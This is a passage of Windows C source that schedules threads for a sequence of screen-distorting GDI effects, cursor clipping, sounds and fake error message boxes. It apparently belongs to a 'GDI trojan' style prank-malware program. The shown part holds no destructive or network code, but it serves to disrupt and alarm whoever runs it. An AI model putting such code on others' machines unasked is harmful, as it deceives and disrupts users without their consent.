	HANDLE thread20 = CreateThread(0, 0, clipping, 0, 0, 0);
	HANDLE thread1 = CreateThread(0, 0, gdi1, 0, 0, 0);
	Sleep(5000);
	TerminateThread(thread1, 0);
	CloseHandle(thread1);
	RedrawWindow(0, 0, 0, 133);
	sound2();
	HANDLE thread2 = CreateThread(0, 0, gdi2, 0, 0, 0);
	TerminateThread(thread2, 0);
	CloseHandle(thread2);
	HANDLE thread3 = CreateThread(0, 0, gdi3, 0, 0, 0);
	Sleep(5000);
	HANDLE thread4 = CreateThread(0, 0, gdi4, 0, 0, 0);
	Sleep(15000);
	TerminateThread(thread3, 0);
	CloseHandle(thread3);
	TerminateThread(thread4, 0);
	CloseHandle(thread4);
	RedrawWindow(0, 0, 0, 133);
	sound3();
	HANDLE thread5 = CreateThread(0, 0, gdi5, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread5, 0);
	CloseHandle(thread5);
	RedrawWindow(0, 0, 0, 133);
	TerminateThread(thread20, 0);
	CloseHandle(thread20);
	sound4();
	HANDLE thread21 = CreateThread(0, 0, circle, 0, 0, 0);
	HANDLE thread6 = CreateThread(0, 0, gdi6, 0, 0, 0);
	Sleep(2000);
	HANDLE error1 = CreateThread(0, 0, msg1, 0, 0, 0);
	CloseHandle(error1);
	Sleep(1000);
	HANDLE error2 = CreateThread(0, 0, msg2, 0, 0, 0);
	CloseHandle(error2);
	Sleep(1000);
	HANDLE error3 = CreateThread(0, 0, msg3, 0, 0, 0);
	CloseHandle(error3);
	Sleep(1000);
	HANDLE error4 = CreateThread(0, 0, msg4, 0, 0, 0);
	CloseHandle(error4);
	Sleep(15000);
	TerminateThread(thread6, 0);
	CloseHandle(thread6);
	TerminateThread(thread21, 0);
	CloseHandle(thread21);
	RedrawWindow(0, 0, 0, 133);
	sound5();
	HANDLE thread22 = CreateThread(0, 0, icon, 0, 0, 0);
	HANDLE thread7 = CreateThread(0, 0, gdi7, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread7, 0);
	CloseHandle(thread7);
	TerminateThread(thread22, 0);
	CloseHandle(thread22);
	sound6();
	HANDLE thread8 = CreateThread(0, 0, gdi8, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread8, 0);
	CloseHandle(thread8);
	sound7();
	HANDLE thread9 = CreateThread(0, 0, gdi9, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread9, 0);
	CloseHandle(thread9);
	sound8();
	HANDLE thread25 = CreateThread(0, 0, circle, 0, 0, 0);
	HANDLE thread10 = CreateThread(0, 0, gdi10, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread25, 0);
	CloseHandle(thread25);
	TerminateThread(thread10, 0);
	CloseHandle(thread10);
	sound9();
	HANDLE thread11 = CreateThread(0, 0, gdi11, 0, 0, 0);
	Sleep(20000);
	TerminateThread(thread11, 0);
	CloseHandle(thread11);
	exit(1);
	while(1) {}
}